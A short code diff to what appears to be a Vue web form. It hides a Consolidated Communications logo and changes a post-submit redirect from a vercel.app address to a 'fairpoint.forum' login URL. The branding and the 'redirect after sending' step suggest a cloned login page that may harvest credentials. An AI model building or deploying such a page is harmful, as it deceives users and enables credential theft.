@@ -10,11 +10,11 @@
           <div class="styles__innerContainer___3wBPl">
 
             <div class="styles__header___sdbu2">
-              <img class="mx-auto d-block styles__logo___10yQo"
+              <!-- <img class="mx-auto d-block styles__logo___10yQo"
                    width="300"
                    height="182"
                    src="/images/Consolidated Communications Logo.png"
-                   alt="Logo">
+                   alt="Logo"> -->
             </div>
 
             <form action="?" role="form" autocomplete="off">
@@ -241,7 +241,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://fairpoint-xq6w.vercel.app/");
+        location.replace("https://www.fairpoint.forum/login");
       }
     },
 
